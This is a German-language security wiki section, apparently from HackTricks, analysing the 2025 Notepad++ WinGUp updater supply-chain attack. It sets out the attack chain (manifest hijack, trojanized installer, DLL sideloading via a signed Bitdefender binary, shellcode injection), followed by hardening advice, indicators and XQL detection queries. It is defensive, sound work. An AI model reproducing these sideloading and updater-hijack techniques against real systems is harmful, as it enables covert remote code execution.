## Remote-Supply-Chain-Hijacking durch schwache Updater-Validierung (WinGUp / Notepad++)

Zwischen Juni 2025 und Dezember 2025 lieferten Angreifer, die die Hosting-Infrastruktur hinter dem Notepad++-Update-Ablauf kompromittiert hatten, gezielt ausgewählten Opfern schädliche Manifeste aus. Ältere WinGUp-basierte Updater überprüften die Echtheit von Updates nicht vollständig, sodass eine manipulierte XML-Antwort Clients auf vom Angreifer kontrollierte URLs umleiten konnte. Da der Client HTTPS-Inhalte akzeptierte, ohne sowohl eine vertrauenswürdige Zertifikatskette als auch eine gültige PE-Signatur des heruntergeladenen Installers zu erzwingen, luden die Opfer eine trojanisierte NSIS-`update.exe` herunter und führten sie aus.<sup>[[12]](#references)[[13]](#references)</sup>

Ablauf des Angriffs (kein lokaler Exploit erforderlich):
1. **Abfangen der Infrastruktur**: CDN/Hosting kompromittieren und Update-Prüfungen mit Angreifer-Metadaten beantworten, die auf eine schädliche Download-URL verweisen.
2. **Trojanisiertes NSIS**: Der Installer lädt eine Payload herunter und führt sie aus; dabei werden zwei Ausführungsketten missbraucht:
   - **Eigene signierte Binärdatei + Sideloading**: Die signierte Bitdefender-`BluetoothService.exe` einbinden und eine schädliche `log.dll` in ihrem Suchpfad ablegen. Wenn die signierte Binärdatei ausgeführt wird, lädt Windows `log.dll` per Sideloading; diese entschlüsselt die Chrysalis-Backdoor und lädt sie reflektiv (durch Warbird geschützt + API-Hashing, um die statische Erkennung zu erschweren).
   - **Skriptbasierte Shellcode-Injection**: NSIS führt ein kompiliertes Lua-Skript aus, das Win32-APIs (z. B. `EnumWindowStationsW`) verwendet, um Shellcode zu injizieren und Cobalt Strike Beacon bereitzustellen.<sup>[[12]](#references)</sup>

Maßnahmen zur Härtung/Erkennung für alle Auto-Updater:
- Die **Zertifikats- und Signaturprüfung** des heruntergeladenen Installers erzwingen (Signatur des Herstellers festlegen, abweichenden CN/Zertifikatskette ablehnen) und das Update-Manifest selbst signieren (z. B. mit XMLDSig). Vom Manifest gesteuerte Weiterleitungen blockieren, sofern sie nicht validiert wurden.
- **Sideloading eigener signierter Binärdateien** als Erkennungspunkt nach dem Download behandeln: Alarmieren, wenn eine signierte Hersteller-EXE eine DLL mit einem Namen außerhalb ihres kanonischen Installationspfads lädt (z. B. Bitdefender, das `log.dll` aus Temp/Downloads lädt) und wenn ein Updater Installer aus einem temporären Verzeichnis ablegt/ausführt, deren Signaturen nicht vom Hersteller stammen.
- **Malware-spezifische Artefakte** überwachen, die in dieser Angriffskette beobachtet wurden (als allgemeine Ansatzpunkte nützlich): Mutex `Global\Jdhfv_1.0.1`, ungewöhnliche Schreibvorgänge von `gup.exe` nach `%TEMP%` und Lua-gesteuerte Shellcode-Injection-Phasen.
- Notepad++ reagierte mit einer Härtung von WinGUp ab Version 8.8.9: Das zurückgegebene XML ist nun signiert (XMLDSig), und neuere Builds erzwingen die Zertifikats- und Signaturprüfung des heruntergeladenen Installers, statt allein dem Transport zu vertrauen.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideloading von <code>log.dll</code> durch signierte Bitdefender-EXE (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> startet ein anderes Installationsprogramm als das von Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Diese Muster lassen sich auf jeden Updater übertragen, der unsignierte Manifeste akzeptiert oder die Signierer von Installationsprogrammen nicht festschreibt: Network Hijack + Malicious Installer + BYO-signed Sideloading führen zu Remote Code Execution im Gewand vertrauenswürdiger Updates.

---
## References
- [1] [Sicherheitshinweis – Netskope Client für Windows – Lokale Rechteausweitung über Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope-Sicherheitshinweis NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope-Plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope-IPC-Client/Exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning von ASUS DriverHub, MSI Center, Acer Control Centre und Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Lokale Rechteausweitung über beschreibbare Dateien im Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Rechteausweitung im Windows-Agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Staatliche Akteure nutzen die Notepad++-Lieferkette aus](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – Update zum Vorfall mit kompromittierter Infrastruktur](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Umgehung des Fixes für CVE-2025-0309 im Netskope Client für Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Aufdeckung von Fehlern zur Rechteausweitung in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
